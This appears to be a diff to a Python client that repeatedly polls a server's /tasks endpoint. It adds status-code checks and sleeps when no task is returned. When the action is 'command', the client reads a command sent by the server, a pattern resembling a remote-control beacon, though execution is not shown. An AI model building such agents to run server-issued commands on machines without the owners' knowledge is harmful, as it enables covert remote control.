@@ -34,13 +34,20 @@ class Client:
         while True:
             try:
                 req = requests.get(f"http://{self.server_ip}:{self.port}/tasks")
-                print(req.json())
+                if req.status_code not in [200, 201, 204]:
+                    raise ValueError("Failed to get tasks")
+                elif req.status_code == 204:
+                    print("No tasks")
+                    time.sleep(120)
+                    continue
+                tasks = req.json()
+                print(tasks)
                 if req.status_code not in [200, 201]:
                     raise ValueError("Failed to get tasks")
                 if req.text == "NULL":
                     time.sleep(120)
                     continue
-                task = req.json().get('action')
+                task = tasks.get('action')
                 print(task)
                 if task == "command":
                     command = req.json().get('command')
